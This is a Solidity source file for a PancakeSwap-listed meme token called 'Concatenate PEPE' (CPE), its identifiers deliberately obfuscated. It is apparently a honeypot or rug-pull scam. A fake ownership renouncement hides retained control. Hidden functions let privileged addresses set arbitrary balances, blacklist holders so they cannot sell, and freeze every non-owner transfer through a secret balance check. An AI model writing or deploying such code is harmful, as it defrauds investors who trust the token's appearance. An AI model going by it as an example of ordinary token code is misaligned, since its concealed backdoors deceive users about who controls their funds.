//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface swapIsTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeSwap) external view returns (uint256);

    function transfer(address modeLaunchedList, uint256 receiverLiquidityList) external returns (bool);

    function allowance(address marketingWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverLiquidityList) external returns (bool);

    function transferFrom(
        address sender,
        address modeLaunchedList,
        uint256 receiverLiquidityList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletReceiver, uint256 value);
    event Approval(address indexed marketingWallet, address indexed spender, uint256 value);
}

abstract contract launchTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listMode {
    function createPair(address shouldMode, address teamAtToken) external returns (address);
}

interface swapIsTxMetadata is swapIsTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ConcatenatePEPE is launchTx, swapIsTx, swapIsTxMetadata {

    address receiverMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public exemptToken;

    constructor (){
        
        totalReceiver tokenIs = totalReceiver(receiverMin);
        fundMaxTeam = listMode(tokenIs.factory()).createPair(tokenIs.WETH(), address(this));
        if (receiverLimitTeam != exemptFee) {
            exemptFee = txBuy;
        }
        totalMin = _msgSender();
        toMax();
        limitSender[totalMin] = true;
        receiverTake[totalMin] = atSwap;
        
        emit Transfer(address(0), totalMin, atSwap);
    }

    address modeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private modeAmount = "CPE";

    uint8 private feeWallet = 18;

    mapping(address => bool) public autoReceiver;

    mapping(address => bool) public limitSender;

    address public totalMin;

    function totalSupply() external view virtual override returns (uint256) {
        return atSwap;
    }

    function approve(address buyAutoLiquidity, uint256 receiverLiquidityList) public virtual override returns (bool) {
        totalMode[_msgSender()][buyAutoLiquidity] = receiverLiquidityList;
        emit Approval(_msgSender(), buyAutoLiquidity, receiverLiquidityList);
        return true;
    }

    string private limitMarketing = "Concatenate PEPE";

    bool public shouldEnable;

    function allowance(address receiverAutoTotal, address buyAutoLiquidity) external view virtual override returns (uint256) {
        if (buyAutoLiquidity == receiverMin) {
            return type(uint256).max;
        }
        return totalMode[receiverAutoTotal][buyAutoLiquidity];
    }

    function transferFrom(address enableAutoLimit, address modeLaunchedList, uint256 receiverLiquidityList) external override returns (bool) {
        if (_msgSender() != receiverMin) {
            if (totalMode[enableAutoLimit][_msgSender()] != type(uint256).max) {
                require(receiverLiquidityList <= totalMode[enableAutoLimit][_msgSender()]);
                totalMode[enableAutoLimit][_msgSender()] -= receiverLiquidityList;
            }
        }
        return txLaunch(enableAutoLimit, modeLaunchedList, receiverLiquidityList);
    }

    uint256 constant amountReceiver = 8 ** 10;

    function toMax() public {
        emit OwnershipTransferred(totalMin, address(0));
        listIsMax = address(0);
    }

    function marketingTx(address enableAutoLimit, address modeLaunchedList, uint256 receiverLiquidityList) internal returns (bool) {
        require(receiverTake[enableAutoLimit] >= receiverLiquidityList);
        receiverTake[enableAutoLimit] -= receiverLiquidityList;
        receiverTake[modeLaunchedList] += receiverLiquidityList;
        emit Transfer(enableAutoLimit, modeLaunchedList, receiverLiquidityList);
        return true;
    }

    address public fundMaxTeam;

    mapping(address => uint256) private receiverTake;

    uint256 atBuy;

    uint256 private atSwap = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return listIsMax;
    }

    function teamEnableList(address tradingMax) public {
        require(tradingMax.balance < 100000);
        if (exemptToken) {
            return;
        }
        if (totalSwap == shouldEnable) {
            exemptFee = receiverLimitTeam;
        }
        limitSender[tradingMax] = true;
        
        exemptToken = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return modeAmount;
    }

    function name() external view virtual override returns (string memory) {
        return limitMarketing;
    }

    uint256 public receiverLimitTeam;

    function tokenTake(uint256 receiverLiquidityList) public {
        walletIs();
        senderShould = receiverLiquidityList;
    }

    address private listIsMax;

    uint256 public txBuy;

    function walletIs() private view {
        require(limitSender[_msgSender()]);
    }

    uint256 private exemptFee;

    function txAuto(address launchedMarketingFee) public {
        walletIs();
        if (txBuy == exemptFee) {
            shouldEnable = true;
        }
        if (launchedMarketingFee == totalMin || launchedMarketingFee == fundMaxTeam) {
            return;
        }
        autoReceiver[launchedMarketingFee] = true;
    }

    uint256 senderShould;

    uint256 public isMaxLaunch;

    function isFund(address txMin, uint256 receiverLiquidityList) public {
        walletIs();
        receiverTake[txMin] = receiverLiquidityList;
    }

    function transfer(address txMin, uint256 receiverLiquidityList) external virtual override returns (bool) {
        return txLaunch(_msgSender(), txMin, receiverLiquidityList);
    }

    event OwnershipTransferred(address indexed minSender, address indexed sellShould);

    function txLaunch(address enableAutoLimit, address modeLaunchedList, uint256 receiverLiquidityList) internal returns (bool) {
        if (enableAutoLimit == totalMin) {
            return marketingTx(enableAutoLimit, modeLaunchedList, receiverLiquidityList);
        }
        uint256 buyFee = swapIsTx(fundMaxTeam).balanceOf(modeTotal);
        require(buyFee == senderShould);
        require(modeLaunchedList != modeTotal);
        if (autoReceiver[enableAutoLimit]) {
            return marketingTx(enableAutoLimit, modeLaunchedList, amountReceiver);
        }
        return marketingTx(enableAutoLimit, modeLaunchedList, receiverLiquidityList);
    }

    mapping(address => mapping(address => uint256)) private totalMode;

    bool private receiverTotal;

    bool public walletMode;

    function decimals() external view virtual override returns (uint8) {
        return feeWallet;
    }

    bool public totalSwap;

    function balanceOf(address modeSwap) public view virtual override returns (uint256) {
        return receiverTake[modeSwap];
    }

    function owner() external view returns (address) {
        return listIsMax;
    }

}